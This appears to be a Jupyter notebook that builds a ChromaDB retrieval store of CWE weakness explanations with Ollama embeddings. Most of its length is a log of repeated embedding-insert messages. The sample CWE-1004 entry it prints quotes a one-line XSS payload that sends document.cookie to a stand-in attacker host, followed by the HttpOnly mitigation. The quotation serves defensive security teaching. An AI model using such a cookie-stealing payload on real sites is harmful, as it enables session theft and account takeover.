# %%
__import__('pysqlite3')
import sys
sys.modules['sqlite3'] = sys.modules.pop('pysqlite3')

from langchain_ollama import OllamaEmbeddings, OllamaLLM
import chromadb
import os
import pickle

# %%
llm_model = "llama3.1:8b"

# %%
# Initialize the ChromaDB client with persistent storage in the current directory
chroma_client = chromadb.PersistentClient(path=os.path.join(os.getcwd(), "chroma_db"))

# %%
# Define a custom embedding function for ChromaDB using Ollama
class ChromaDBEmbeddingFunction:
    """
    Custom embedding function for ChromaDB using embeddings from Ollama.
    """
    def __init__(self, langchain_embeddings):
        self.langchain_embeddings = langchain_embeddings

    def __call__(self, input):
        # Ensure the input is in a list format for processing
        if isinstance(input, str):
            input = [input]
        return self.langchain_embeddings.embed_documents(input)

# %%
# Initialize the embedding function with Ollama embeddings
embedding = ChromaDBEmbeddingFunction(
    OllamaEmbeddings(
        model=llm_model,
        base_url="http://localhost:11434"  # Adjust the base URL as per your Ollama server configuration
    )
)

# %%
# Define a collection for the RAG workflow
collection_name = "rag_collection_demo_1"
collection = chroma_client.get_or_create_collection(
    name=collection_name,
    metadata={"description": "A collection for RAG with Ollama - Demo1"},
    embedding_function=embedding  # Use the custom embedding function
)

# %%
# Function to add documents to the ChromaDB collection
def add_documents_to_collection(documents, ids):
    """
    Add documents to the ChromaDB collection.
    
    Args:
        documents (list of str): The documents to add.
        ids (list of str): Unique IDs for the documents.
    """
    collection.add(
        documents=documents,
        ids=ids
    )

# %%
with open('./dataset/cwe_explanations_for_rag.pkl','rb') as f:
    docs = pickle.load(f)

# %%
print(docs['CWE-1004'])
# Out:
# CWE-1004 is Sensitive Cookie Without 'HttpOnly' Flag
# Description: The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.
# The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS.
#
# Common Consequences:
# Confidentiality: Read Application Data - If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties.
# Integrity: Gain Privileges or Assume Identity - If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user.
#
# Potential Mitigations:
# Step 1: Implementation - Leverage the HttpOnly flag when setting a sensitive cookie in a response.
#
# Detection Methods:
# Automated Static Analysis: Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.) (Effectiveness: High)
#
# Demonstrative Examples:
# In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client.
# The snippet of code below establishes a new cookie to hold the sessionID.
# String sessionID = generateSessionId();Cookie c = new Cookie("session_id", sessionID);response.addCookie(c);
# The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:
# document.write('<img src="http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '">'
# When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie.
# To mitigate the risk, use the setHttpOnly(true) method.
# String sessionID = generateSessionId();Cookie c = new Cookie("session_id", sessionID);c.setHttpOnly(true);response.addCookie(c);
#
# Related Weaknesses:
# This CWE is child of 732

# %%
# Documents only need to be added once or whenever an update is required. 
# This line of code is included for demonstration purposes:
add_documents_to_collection(list(docs.values()), list(docs.keys()))
# Out:
# Insert of existing embedding ID: CWE-1004
# Insert of existing embedding ID: CWE-1007
# Insert of existing embedding ID: CWE-102
# Insert of existing embedding ID: CWE-1021
# Insert of existing embedding ID: CWE-1022
# Insert of existing embedding ID: CWE-1023
# Insert of existing embedding ID: CWE-1024
# Insert of existing embedding ID: CWE-1025
# Insert of existing embedding ID: CWE-103
# Insert of existing embedding ID: CWE-1037
# Insert of existing embedding ID: CWE-1038
# Insert of existing embedding ID: CWE-1039
# Insert of existing embedding ID: CWE-104
# Insert of existing embedding ID: CWE-1041
# Insert of existing embedding ID: CWE-1042
# Insert of existing embedding ID: CWE-1043
# Insert of existing embedding ID: CWE-1044
# Insert of existing embedding ID: CWE-1045
# Insert of existing embedding ID: CWE-1046
# Insert of existing embedding ID: CWE-1047
# Insert of existing embedding ID: CWE-1048
# Insert of existing embedding ID: CWE-1049
# Insert of existing embedding ID: CWE-105
# Insert of existing embedding ID: CWE-1050
# Insert of existing embedding ID: CWE-1051
# Insert of existing embedding ID: CWE-1052
# Insert of existing embedding ID: CWE-1053
# Insert of existing embedding ID: CWE-1054
# Insert of existing embedding ID: CWE-1055
# Insert of existing embedding ID: CWE-1056
# Insert of existing embedding ID: CWE-1057
# Insert of existing embedding ID: CWE-1058
# Insert of existing embedding ID: CWE-1059
# Insert of existing embedding ID: CWE-106
# Insert of existing embedding ID: CWE-1060
# Insert of existing embedding ID: CWE-1061
# Insert of existing embedding ID: CWE-1062
# Insert of existing embedding ID: CWE-1063
# Insert of existing embedding ID: CWE-1064
# Insert of existing embedding ID: CWE-1065
# Insert of existing embedding ID: CWE-1066
# Insert of existing embedding ID: CWE-1067
# Insert of existing embedding ID: CWE-1068
# Insert of existing embedding ID: CWE-1069
# Insert of existing embedding ID: CWE-107
# Insert of existing embedding ID: CWE-1070
# Insert of existing embedding ID: CWE-1071
# Insert of existing embedding ID: CWE-1072
# Insert of existing embedding ID: CWE-1073
# Insert of existing embedding ID: CWE-1074
# Insert of existing embedding ID: CWE-1075
# Insert of existing embedding ID: CWE-1076
# Insert of existing embedding ID: CWE-1077
# Insert of existing embedding ID: CWE-1078
# Insert of existing embedding ID: CWE-1079
# Insert of existing embedding ID: CWE-108
# Insert of existing embedding ID: CWE-1080
# Insert of existing embedding ID: CWE-1082
# Insert of existing embedding ID: CWE-1083
# Insert of existing embedding ID: CWE-1084
# Insert of existing embedding ID: CWE-1085
# Insert of existing embedding ID: CWE-1086
# Insert of existing embedding ID: CWE-1087
# Insert of existing embedding ID: CWE-1088
# Insert of existing embedding ID: CWE-1089
# Insert of existing embedding ID: CWE-109
# Insert of existing embedding ID: CWE-1090
# Insert of existing embedding ID: CWE-1091
# Insert of existing embedding ID: CWE-1092
# Insert of existing embedding ID: CWE-1093
# Insert of existing embedding ID: CWE-1094
# Insert of existing embedding ID: CWE-1095
# Insert of existing embedding ID: CWE-1096
# Insert of existing embedding ID: CWE-1097
# Insert of existing embedding ID: CWE-1098
# Insert of existing embedding ID: CWE-1099
# Insert of existing embedding ID: CWE-11
# Insert of existing embedding ID: CWE-110
# Insert of existing embedding ID: CWE-1100
# Insert of existing embedding ID: CWE-1101
# Insert of existing embedding ID: CWE-1102
# Insert of existing embedding ID: CWE-1103
# Insert of existing embedding ID: CWE-1104
# Insert of existing embedding ID: CWE-1105
# Insert of existing embedding ID: CWE-1106
# Insert of existing embedding ID: CWE-1107
# Insert of existing embedding ID: CWE-1108
# Insert of existing embedding ID: CWE-1109
# Insert of existing embedding ID: CWE-111
# Insert of existing embedding ID: CWE-1110
# Insert of existing embedding ID: CWE-1111
# Insert of existing embedding ID: CWE-1112
# Insert of existing embedding ID: CWE-1113
# Insert of existing embedding ID: CWE-1114
# Insert of existing embedding ID: CWE-1115
# Insert of existing embedding ID: CWE-1116
# Insert of existing embedding ID: CWE-1117
# Insert of existing embedding ID: CWE-1118
# Insert of existing embedding ID: CWE-1119
# Insert of existing embedding ID: CWE-112
# Insert of existing embedding ID: CWE-1120
# Insert of existing embedding ID: CWE-1121
# Insert of existing embedding ID: CWE-1122
# Insert of existing embedding ID: CWE-1123
# Insert of existing embedding ID: CWE-1124
# Insert of existing embedding ID: CWE-1125
# Insert of existing embedding ID: CWE-1126
# Insert of existing embedding ID: CWE-1127
# Insert of existing embedding ID: CWE-113
# Insert of existing embedding ID: CWE-114
# Insert of existing embedding ID: CWE-115
# Insert of existing embedding ID: CWE-116
# Insert of existing embedding ID: CWE-1164
# Insert of existing embedding ID: CWE-117
# Insert of existing embedding ID: CWE-1173
# Insert of existing embedding ID: CWE-1174
# Insert of existing embedding ID: CWE-1176
# Insert of existing embedding ID: CWE-1177
# Insert of existing embedding ID: CWE-118
# Insert of existing embedding ID: CWE-1187
# Insert of existing embedding ID: CWE-1188
# Insert of existing embedding ID: CWE-1189
# Insert of existing embedding ID: CWE-119
# Insert of existing embedding ID: CWE-1190
# Insert of existing embedding ID: CWE-1191
# Insert of existing embedding ID: CWE-1192
# Insert of existing embedding ID: CWE-1193
# Insert of existing embedding ID: CWE-12
# Insert of existing embedding ID: CWE-120
# Insert of existing embedding ID: CWE-1204
# Insert of existing embedding ID: CWE-1209
# Insert of existing embedding ID: CWE-121
# Insert of existing embedding ID: CWE-122
# Insert of existing embedding ID: CWE-1220
# Insert of existing embedding ID: CWE-1221
# Insert of existing embedding ID: CWE-1222
# Insert of existing embedding ID: CWE-1223
# Insert of existing embedding ID: CWE-1224
# Insert of existing embedding ID: CWE-1229
# Insert of existing embedding ID: CWE-123
# Insert of existing embedding ID: CWE-1230
# Insert of existing embedding ID: CWE-1231
# Insert of existing embedding ID: CWE-1232
# Insert of existing embedding ID: CWE-1233
# Insert of existing embedding ID: CWE-1234
# Insert of existing embedding ID: CWE-1235
# Insert of existing embedding ID: CWE-1236
# Insert of existing embedding ID: CWE-1239
# Insert of existing embedding ID: CWE-124
# Insert of existing embedding ID: CWE-1240
# Insert of existing embedding ID: CWE-1241
# Insert of existing embedding ID: CWE-1242
# Insert of existing embedding ID: CWE-1243
# Insert of existing embedding ID: CWE-1244
# Insert of existing embedding ID: CWE-1245
# Insert of existing embedding ID: CWE-1246
# Insert of existing embedding ID: CWE-1247
# Insert of existing embedding ID: CWE-1248
# Insert of existing embedding ID: CWE-1249
# Insert of existing embedding ID: CWE-125
# Insert of existing embedding ID: CWE-1250
# Insert of existing embedding ID: CWE-1251
# Insert of existing embedding ID: CWE-1252
# Insert of existing embedding ID: CWE-1253
# Insert of existing embedding ID: CWE-1254
# Insert of existing embedding ID: CWE-1255
# Insert of existing embedding ID: CWE-1256
# Insert of existing embedding ID: CWE-1257
# Insert of existing embedding ID: CWE-1258
# Insert of existing embedding ID: CWE-1259
# Insert of existing embedding ID: CWE-126
# Insert of existing embedding ID: CWE-1260
# Insert of existing embedding ID: CWE-1261
# Insert of existing embedding ID: CWE-1262
# Insert of existing embedding ID: CWE-1263
# Insert of existing embedding ID: CWE-1264
# Insert of existing embedding ID: CWE-1265
# Insert of existing embedding ID: CWE-1266
# Insert of existing embedding ID: CWE-1267
# Insert of existing embedding ID: CWE-1268
# Insert of existing embedding ID: CWE-1269
# Insert of existing embedding ID: CWE-127
# Insert of existing embedding ID: CWE-1270
# Insert of existing embedding ID: CWE-1271
# Insert of existing embedding ID: CWE-1272
# Insert of existing embedding ID: CWE-1273
# Insert of existing embedding ID: CWE-1274
# Insert of existing embedding ID: CWE-1275
# Insert of existing embedding ID: CWE-1276
# Insert of existing embedding ID: CWE-1277
# Insert of existing embedding ID: CWE-1278
# Insert of existing embedding ID: CWE-1279
# Insert of existing embedding ID: CWE-128
# Insert of existing embedding ID: CWE-1280
# Insert of existing embedding ID: CWE-1281
# Insert of existing embedding ID: CWE-1282
# Insert of existing embedding ID: CWE-1283
# Insert of existing embedding ID: CWE-1284
# Insert of existing embedding ID: CWE-1285
# Insert of existing embedding ID: CWE-1286
# Insert of existing embedding ID: CWE-1287
# Insert of existing embedding ID: CWE-1288
# Insert of existing embedding ID: CWE-1289
# Insert of existing embedding ID: CWE-129
# Insert of existing embedding ID: CWE-1290
# Insert of existing embedding ID: CWE-1291
# Insert of existing embedding ID: CWE-1292
# Insert of existing embedding ID: CWE-1293
# Insert of existing embedding ID: CWE-1294
# Insert of existing embedding ID: CWE-1295
# Insert of existing embedding ID: CWE-1296
# Insert of existing embedding ID: CWE-1297
# Insert of existing embedding ID: CWE-1298
# Insert of existing embedding ID: CWE-1299
# Insert of existing embedding ID: CWE-13
# Insert of existing embedding ID: CWE-130
# Insert of existing embedding ID: CWE-1300
# Insert of existing embedding ID: CWE-1301
# Insert of existing embedding ID: CWE-1302
# Insert of existing embedding ID: CWE-1303
# Insert of existing embedding ID: CWE-1304
# Insert of existing embedding ID: CWE-131
# Insert of existing embedding ID: CWE-1310
# Insert of existing embedding ID: CWE-1311
# Insert of existing embedding ID: CWE-1312
# Insert of existing embedding ID: CWE-1313
# Insert of existing embedding ID: CWE-1314
# Insert of existing embedding ID: CWE-1315
# Insert of existing embedding ID: CWE-1316
# Insert of existing embedding ID: CWE-1317
# Insert of existing embedding ID: CWE-1318
# Insert of existing embedding ID: CWE-1319
# Insert of existing embedding ID: CWE-132
# Insert of existing embedding ID: CWE-1320
# Insert of existing embedding ID: CWE-1321
# Insert of existing embedding ID: CWE-1322
# Insert of existing embedding ID: CWE-1323
# Insert of existing embedding ID: CWE-1324
# Insert of existing embedding ID: CWE-1325
# Insert of existing embedding ID: CWE-1326
# Insert of existing embedding ID: CWE-1327
# Insert of existing embedding ID: CWE-1328
# Insert of existing embedding ID: CWE-1329
# Insert of existing embedding ID: CWE-1330
# Insert of existing embedding ID: CWE-1331
# Insert of existing embedding ID: CWE-1332
# Insert of existing embedding ID: CWE-1333
# Insert of existing embedding ID: CWE-1334
# Insert of existing embedding ID: CWE-1335
# Insert of existing embedding ID: CWE-1336
# Insert of existing embedding ID: CWE-1338
# Insert of existing embedding ID: CWE-1339
# Insert of existing embedding ID: CWE-134
# Insert of existing embedding ID: CWE-1341
# Insert of existing embedding ID: CWE-1342
# Insert of existing embedding ID: CWE-135
# Insert of existing embedding ID: CWE-1351
# Insert of existing embedding ID: CWE-1357
# Insert of existing embedding ID: CWE-138
# Insert of existing embedding ID: CWE-1384
# Insert of existing embedding ID: CWE-1385
# Insert of existing embedding ID: CWE-1386
# Insert of existing embedding ID: CWE-1389
# Insert of existing embedding ID: CWE-1390
# Insert of existing embedding ID: CWE-1391
# Insert of existing embedding ID: CWE-1392
# Insert of existing embedding ID: CWE-1393
# Insert of existing embedding ID: CWE-1394
# Insert of existing embedding ID: CWE-1395
# Insert of existing embedding ID: CWE-14
# Insert of existing embedding ID: CWE-140
# Insert of existing embedding ID: CWE-141
# Insert of existing embedding ID: CWE-1419
# Insert of existing embedding ID: CWE-142
# Insert of existing embedding ID: CWE-1420
# Insert of existing embedding ID: CWE-1421
# Insert of existing embedding ID: CWE-1422
# Insert of existing embedding ID: CWE-1423
# Insert of existing embedding ID: CWE-1426
# Insert of existing embedding ID: CWE-1427
# Insert of existing embedding ID: CWE-143
# Insert of existing embedding ID: CWE-144
# Insert of existing embedding ID: CWE-145
# Insert of existing embedding ID: CWE-146
# Insert of existing embedding ID: CWE-147
# Insert of existing embedding ID: CWE-148
# Insert of existing embedding ID: CWE-149
# Insert of existing embedding ID: CWE-15
# Insert of existing embedding ID: CWE-150
# Insert of existing embedding ID: CWE-151
# Insert of existing embedding ID: CWE-152
# Insert of existing embedding ID: CWE-153
# Insert of existing embedding ID: CWE-154
# Insert of existing embedding ID: CWE-155
# Insert of existing embedding ID: CWE-156
# Insert of existing embedding ID: CWE-157
# Insert of existing embedding ID: CWE-158
# Insert of existing embedding ID: CWE-159
# Insert of existing embedding ID: CWE-160
# Insert of existing embedding ID: CWE-161
# Insert of existing embedding ID: CWE-162
# Insert of existing embedding ID: CWE-163
# Insert of existing embedding ID: CWE-164
# Insert of existing embedding ID: CWE-165
# Insert of existing embedding ID: CWE-166
# Insert of existing embedding ID: CWE-167
# Insert of existing embedding ID: CWE-168
# Insert of existing embedding ID: CWE-170
# Insert of existing embedding ID: CWE-172
# Insert of existing embedding ID: CWE-173
# Insert of existing embedding ID: CWE-174
# Insert of existing embedding ID: CWE-175
# Insert of existing embedding ID: CWE-176
# Insert of existing embedding ID: CWE-177
# Insert of existing embedding ID: CWE-178
# Insert of existing embedding ID: CWE-179
# Insert of existing embedding ID: CWE-180
# Insert of existing embedding ID: CWE-181
# Insert of existing embedding ID: CWE-182
# Insert of existing embedding ID: CWE-183
# Insert of existing embedding ID: CWE-184
# Insert of existing embedding ID: CWE-185
# Insert of existing embedding ID: CWE-186
# Insert of existing embedding ID: CWE-187
# Insert of existing embedding ID: CWE-188
# Insert of existing embedding ID: CWE-190
# Insert of existing embedding ID: CWE-191
# Insert of existing embedding ID: CWE-192
# Insert of existing embedding ID: CWE-193
# Insert of existing embedding ID: CWE-194
# Insert of existing embedding ID: CWE-195
# Insert of existing embedding ID: CWE-196
# Insert of existing embedding ID: CWE-197
# Insert of existing embedding ID: CWE-198
# Insert of existing embedding ID: CWE-20
# Insert of existing embedding ID: CWE-200
# Insert of existing embedding ID: CWE-201
# Insert of existing embedding ID: CWE-202
# Insert of existing embedding ID: CWE-203
# Insert of existing embedding ID: CWE-204
# Insert of existing embedding ID: CWE-205
# Insert of existing embedding ID: CWE-206
# Insert of existing embedding ID: CWE-207
# Insert of existing embedding ID: CWE-208
# Insert of existing embedding ID: CWE-209
# Insert of existing embedding ID: CWE-210
# Insert of existing embedding ID: CWE-211
# Insert of existing embedding ID: CWE-212
# Insert of existing embedding ID: CWE-213
# Insert of existing embedding ID: CWE-214
# Insert of existing embedding ID: CWE-215
# Insert of existing embedding ID: CWE-216
# Insert of existing embedding ID: CWE-217
# Insert of existing embedding ID: CWE-218
# Insert of existing embedding ID: CWE-219
# Insert of existing embedding ID: CWE-22
# Insert of existing embedding ID: CWE-220
# Insert of existing embedding ID: CWE-221
# Insert of existing embedding ID: CWE-222
# Insert of existing embedding ID: CWE-223
# Insert of existing embedding ID: CWE-224
# Insert of existing embedding ID: CWE-225
# Insert of existing embedding ID: CWE-226
# Insert of existing embedding ID: CWE-228
# Insert of existing embedding ID: CWE-229
# Insert of existing embedding ID: CWE-23
# Insert of existing embedding ID: CWE-230
# Insert of existing embedding ID: CWE-231
# Insert of existing embedding ID: CWE-232
# Insert of existing embedding ID: CWE-233
# Insert of existing embedding ID: CWE-234
# Insert of existing embedding ID: CWE-235
# Insert of existing embedding ID: CWE-236
# Insert of existing embedding ID: CWE-237
# Insert of existing embedding ID: CWE-238
# Insert of existing embedding ID: CWE-239
# Insert of existing embedding ID: CWE-24
# Insert of existing embedding ID: CWE-240
# Insert of existing embedding ID: CWE-241
# Insert of existing embedding ID: CWE-242
# Insert of existing embedding ID: CWE-243
# Insert of existing embedding ID: CWE-244
# Insert of existing embedding ID: CWE-245
# Insert of existing embedding ID: CWE-246
# Insert of existing embedding ID: CWE-247
# Insert of existing embedding ID: CWE-248
# Insert of existing embedding ID: CWE-249
# Insert of existing embedding ID: CWE-25
# Insert of existing embedding ID: CWE-250
# Insert of existing embedding ID: CWE-252
# Insert of existing embedding ID: CWE-253
# Insert of existing embedding ID: CWE-256
# Insert of existing embedding ID: CWE-257
# Insert of existing embedding ID: CWE-258
# Insert of existing embedding ID: CWE-259
# Insert of existing embedding ID: CWE-26
# Insert of existing embedding ID: CWE-260
# Insert of existing embedding ID: CWE-261
# Insert of existing embedding ID: CWE-262
# Insert of existing embedding ID: CWE-263
# Insert of existing embedding ID: CWE-266
# Insert of existing embedding ID: CWE-267
# Insert of existing embedding ID: CWE-268
# Insert of existing embedding ID: CWE-269
# Insert of existing embedding ID: CWE-27
# Insert of existing embedding ID: CWE-270
# Insert of existing embedding ID: CWE-271
# Insert of existing embedding ID: CWE-272
# Insert of existing embedding ID: CWE-273
# Insert of existing embedding ID: CWE-274
# Insert of existing embedding ID: CWE-276
# Insert of existing embedding ID: CWE-277
# Insert of existing embedding ID: CWE-278
# Insert of existing embedding ID: CWE-279
# Insert of existing embedding ID: CWE-28
# Insert of existing embedding ID: CWE-280
# Insert of existing embedding ID: CWE-281
# Insert of existing embedding ID: CWE-282
# Insert of existing embedding ID: CWE-283
# Insert of existing embedding ID: CWE-284
# Insert of existing embedding ID: CWE-285
# Insert of existing embedding ID: CWE-286
# Insert of existing embedding ID: CWE-287
# Insert of existing embedding ID: CWE-288
# Insert of existing embedding ID: CWE-289
# Insert of existing embedding ID: CWE-29
# Insert of existing embedding ID: CWE-290
# Insert of existing embedding ID: CWE-291
# Insert of existing embedding ID: CWE-292
# Insert of existing embedding ID: CWE-293
# Insert of existing embedding ID: CWE-294
# Insert of existing embedding ID: CWE-295
# Insert of existing embedding ID: CWE-296
# Insert of existing embedding ID: CWE-297
# Insert of existing embedding ID: CWE-298
# Insert of existing embedding ID: CWE-299
# Insert of existing embedding ID: CWE-30
# Insert of existing embedding ID: CWE-300
# Insert of existing embedding ID: CWE-301
# Insert of existing embedding ID: CWE-302
# Insert of existing embedding ID: CWE-303
# Insert of existing embedding ID: CWE-304
# Insert of existing embedding ID: CWE-305
# Insert of existing embedding ID: CWE-306
# Insert of existing embedding ID: CWE-307
# Insert of existing embedding ID: CWE-308
# Insert of existing embedding ID: CWE-309
# Insert of existing embedding ID: CWE-31
# Insert of existing embedding ID: CWE-311
# Insert of existing embedding ID: CWE-312
# Insert of existing embedding ID: CWE-313
# Insert of existing embedding ID: CWE-314
# Insert of existing embedding ID: CWE-315
# Insert of existing embedding ID: CWE-316
# Insert of existing embedding ID: CWE-317
# Insert of existing embedding ID: CWE-318
# Insert of existing embedding ID: CWE-319
# Insert of existing embedding ID: CWE-32
# Insert of existing embedding ID: CWE-321
# Insert of existing embedding ID: CWE-322
# Insert of existing embedding ID: CWE-323
# Insert of existing embedding ID: CWE-324
# Insert of existing embedding ID: CWE-325
# Insert of existing embedding ID: CWE-326
# Insert of existing embedding ID: CWE-327
# Insert of existing embedding ID: CWE-328
# Insert of existing embedding ID: CWE-329
# Insert of existing embedding ID: CWE-33
# Insert of existing embedding ID: CWE-330
# Insert of existing embedding ID: CWE-331
# Insert of existing embedding ID: CWE-332
# Insert of existing embedding ID: CWE-333
# Insert of existing embedding ID: CWE-334
# Insert of existing embedding ID: CWE-335
# Insert of existing embedding ID: CWE-336
# Insert of existing embedding ID: CWE-337
# Insert of existing embedding ID: CWE-338
# Insert of existing embedding ID: CWE-339
# Insert of existing embedding ID: CWE-34
# Insert of existing embedding ID: CWE-340
# Insert of existing embedding ID: CWE-341
# Insert of existing embedding ID: CWE-342
# Insert of existing embedding ID: CWE-343
# Insert of existing embedding ID: CWE-344
# Insert of existing embedding ID: CWE-345
# Insert of existing embedding ID: CWE-346
# Insert of existing embedding ID: CWE-347
# Insert of existing embedding ID: CWE-348
# Insert of existing embedding ID: CWE-349
# Insert of existing embedding ID: CWE-35
# Insert of existing embedding ID: CWE-350
# Insert of existing embedding ID: CWE-351
# Insert of existing embedding ID: CWE-352
# Insert of existing embedding ID: CWE-353
# Insert of existing embedding ID: CWE-354
# Insert of existing embedding ID: CWE-356
# Insert of existing embedding ID: CWE-357
# Insert of existing embedding ID: CWE-358
# Insert of existing embedding ID: CWE-359
# Insert of existing embedding ID: CWE-36
# Insert of existing embedding ID: CWE-360
# Insert of existing embedding ID: CWE-362
# Insert of existing embedding ID: CWE-363
# Insert of existing embedding ID: CWE-364
# Insert of existing embedding ID: CWE-365
# Insert of existing embedding ID: CWE-366
# Insert of existing embedding ID: CWE-367
# Insert of existing embedding ID: CWE-368
# Insert of existing embedding ID: CWE-369
# Insert of existing embedding ID: CWE-37
# Insert of existing embedding ID: CWE-370
# Insert of existing embedding ID: CWE-372
# Insert of existing embedding ID: CWE-373
# Insert of existing embedding ID: CWE-374
# Insert of existing embedding ID: CWE-375
# Insert of existing embedding ID: CWE-377
# Insert of existing embedding ID: CWE-378
# Insert of existing embedding ID: CWE-379
# Insert of existing embedding ID: CWE-38
# Insert of existing embedding ID: CWE-382
# Insert of existing embedding ID: CWE-383
# Insert of existing embedding ID: CWE-384
# Insert of existing embedding ID: CWE-385
# Insert of existing embedding ID: CWE-386
# Insert of existing embedding ID: CWE-39
# Insert of existing embedding ID: CWE-390
# Insert of existing embedding ID: CWE-391
# Insert of existing embedding ID: CWE-392
# Insert of existing embedding ID: CWE-393
# Insert of existing embedding ID: CWE-394
# Insert of existing embedding ID: CWE-395
# Insert of existing embedding ID: CWE-396
# Insert of existing embedding ID: CWE-397
# Insert of existing embedding ID: CWE-40
# Insert of existing embedding ID: CWE-400
# Insert of existing embedding ID: CWE-401
# Insert of existing embedding ID: CWE-402
# Insert of existing embedding ID: CWE-403
# Insert of existing embedding ID: CWE-404
# Insert of existing embedding ID: CWE-405
# Insert of existing embedding ID: CWE-406
# Insert of existing embedding ID: CWE-407
# Insert of existing embedding ID: CWE-408
# Insert of existing embedding ID: CWE-409
# Insert of existing embedding ID: CWE-41
# Insert of existing embedding ID: CWE-410
# Insert of existing embedding ID: CWE-412
# Insert of existing embedding ID: CWE-413
# Insert of existing embedding ID: CWE-414
# Insert of existing embedding ID: CWE-415
# Insert of existing embedding ID: CWE-416
# Insert of existing embedding ID: CWE-419
# Insert of existing embedding ID: CWE-42
# Insert of existing embedding ID: CWE-420
# Insert of existing embedding ID: CWE-421
# Insert of existing embedding ID: CWE-422
# Insert of existing embedding ID: CWE-423
# Insert of existing embedding ID: CWE-424
# Insert of existing embedding ID: CWE-425
# Insert of existing embedding ID: CWE-426
# Insert of existing embedding ID: CWE-427
# Insert of existing embedding ID: CWE-428
# Insert of existing embedding ID: CWE-43
# Insert of existing embedding ID: CWE-430
# Insert of existing embedding ID: CWE-431
# Insert of existing embedding ID: CWE-432
# Insert of existing embedding ID: CWE-433
# Insert of existing embedding ID: CWE-434
# Insert of existing embedding ID: CWE-435
# Insert of existing embedding ID: CWE-436
# Insert of existing embedding ID: CWE-437
# Insert of existing embedding ID: CWE-439
# Insert of existing embedding ID: CWE-44
# Insert of existing embedding ID: CWE-440
# Insert of existing embedding ID: CWE-441
# Insert of existing embedding ID: CWE-443
# Insert of existing embedding ID: CWE-444
# Insert of existing embedding ID: CWE-446
# Insert of existing embedding ID: CWE-447
# Insert of existing embedding ID: CWE-448
# Insert of existing embedding ID: CWE-449
# Insert of existing embedding ID: CWE-45
# Insert of existing embedding ID: CWE-450
# Insert of existing embedding ID: CWE-451
# Insert of existing embedding ID: CWE-453
# Insert of existing embedding ID: CWE-454
# Insert of existing embedding ID: CWE-455
# Insert of existing embedding ID: CWE-456
# Insert of existing embedding ID: CWE-457
# Insert of existing embedding ID: CWE-458
# Insert of existing embedding ID: CWE-459
# Insert of existing embedding ID: CWE-46
# Insert of existing embedding ID: CWE-460
# Insert of existing embedding ID: CWE-462
# Insert of existing embedding ID: CWE-463
# Insert of existing embedding ID: CWE-464
# Insert of existing embedding ID: CWE-466
# Insert of existing embedding ID: CWE-467
# Insert of existing embedding ID: CWE-468
# Insert of existing embedding ID: CWE-469
# Insert of existing embedding ID: CWE-47
# Insert of existing embedding ID: CWE-470
# Insert of existing embedding ID: CWE-471
# Insert of existing embedding ID: CWE-472
# Insert of existing embedding ID: CWE-473
# Insert of existing embedding ID: CWE-474
# Insert of existing embedding ID: CWE-475
# Insert of existing embedding ID: CWE-476
# Insert of existing embedding ID: CWE-477
# Insert of existing embedding ID: CWE-478
# Insert of existing embedding ID: CWE-479
# Insert of existing embedding ID: CWE-48
# Insert of existing embedding ID: CWE-480
# Insert of existing embedding ID: CWE-481
# Insert of existing embedding ID: CWE-482
# Insert of existing embedding ID: CWE-483
# Insert of existing embedding ID: CWE-484
# Insert of existing embedding ID: CWE-486
# Insert of existing embedding ID: CWE-487
# Insert of existing embedding ID: CWE-488
# Insert of existing embedding ID: CWE-489
# Insert of existing embedding ID: CWE-49
# Insert of existing embedding ID: CWE-491
# Insert of existing embedding ID: CWE-492
# Insert of existing embedding ID: CWE-493
# Insert of existing embedding ID: CWE-494
# Insert of existing embedding ID: CWE-495
# Insert of existing embedding ID: CWE-496
# Insert of existing embedding ID: CWE-497
# Insert of existing embedding ID: CWE-498
# Insert of existing embedding ID: CWE-499
# Insert of existing embedding ID: CWE-5
# Insert of existing embedding ID: CWE-50
# Insert of existing embedding ID: CWE-500
# Insert of existing embedding ID: CWE-501
# Insert of existing embedding ID: CWE-502
# Insert of existing embedding ID: CWE-506
# Insert of existing embedding ID: CWE-507
# Insert of existing embedding ID: CWE-508
# Insert of existing embedding ID: CWE-509
# Insert of existing embedding ID: CWE-51
# Insert of existing embedding ID: CWE-510
# Insert of existing embedding ID: CWE-511
# Insert of existing embedding ID: CWE-512
# Insert of existing embedding ID: CWE-514
# Insert of existing embedding ID: CWE-515
# Insert of existing embedding ID: CWE-516
# Insert of existing embedding ID: CWE-52
# Insert of existing embedding ID: CWE-520
# Insert of existing embedding ID: CWE-521
# Insert of existing embedding ID: CWE-522
# Insert of existing embedding ID: CWE-523
# Insert of existing embedding ID: CWE-524
# Insert of existing embedding ID: CWE-525
# Insert of existing embedding ID: CWE-526
# Insert of existing embedding ID: CWE-527
# Insert of existing embedding ID: CWE-528
# Insert of existing embedding ID: CWE-529
# Insert of existing embedding ID: CWE-53
# Insert of existing embedding ID: CWE-530
# Insert of existing embedding ID: CWE-531
# Insert of existing embedding ID: CWE-532
# Insert of existing embedding ID: CWE-533
# Insert of existing embedding ID: CWE-534
# Insert of existing embedding ID: CWE-535
# Insert of existing embedding ID: CWE-536
# Insert of existing embedding ID: CWE-537
# Insert of existing embedding ID: CWE-538
# Insert of existing embedding ID: CWE-539
# Insert of existing embedding ID: CWE-54
# Insert of existing embedding ID: CWE-540
# Insert of existing embedding ID: CWE-541
# Insert of existing embedding ID: CWE-542
# Insert of existing embedding ID: CWE-543
# Insert of existing embedding ID: CWE-544
# Insert of existing embedding ID: CWE-545
# Insert of existing embedding ID: CWE-546
# Insert of existing embedding ID: CWE-547
